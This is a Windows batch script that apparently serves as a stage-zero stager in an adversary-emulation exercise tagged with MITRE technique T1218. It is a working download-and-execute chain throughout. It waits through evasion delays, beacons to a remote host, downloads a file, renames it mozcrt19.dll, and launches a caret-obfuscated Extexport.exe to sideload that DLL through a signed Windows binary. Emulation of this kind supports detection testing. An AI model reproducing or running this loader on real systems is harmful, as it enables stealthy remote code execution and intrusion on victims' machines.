@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET yktnwwf=%APPDATA%\8596\483f7bab
SET fpakbq=Macula-Stage0-8596
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8596-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=chr0me.txt
SET fpldhe=8596

SET zxcvbn=%APPDATA%\!yydue!
SET qwerty=!zxcvbn!\macula-simulations.log
SET asdfgh=T1218
SET lkjhg=0
SET mnbvc=

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_start>> "!qwerty!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_complete>> "!qwerty!" 2>nul

if not exist "!zxcvbn!" mkdir "!zxcvbn!" >nul 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start>> "!qwerty!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_complete>> "!qwerty!" 2>nul

ping -n 10 127.0.0.1 >nul
SET a=Ex^t^e^x^p^o^r^t
SET b=.!e^x^e
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_start>> "!qwerty!" 2>nul
c^u^r^l -k -s -o "!yktnwwf!\!edjwtl!" "!repbmqg!"
if exist "!yktnwwf!\!edjwtl!" (
    ren "!yktnwwf!\!edjwtl!" mozcrt19.dll
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_complete>> "!qwerty!" 2>nul
    SET lkjhg=1
) else (
    SET mnbvc=download_failed
)

CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_start>> "!qwerty!" 2>nul
cd /d "!yktnwwf!"
!a!!b! "%cd%" foo bar
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_complete>> "!qwerty!" 2>nul

SET /A rnddelay=%RANDOM% %% 20 + 10
timeout /t !rnddelay! /nobreak >nul
SET dt=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2!
SET tm=!TIME: =0!
SET ts=!dt! !tm:~0,8!.!tm:~9,3!
echo [!ts!][!omxgazu!]: !yydue!-!fpldhe!-!asdfgh!|Signed_Binary_Proxy_Execution=!lkjhg!:!mnbvc!>> "!qwerty!" 2>nul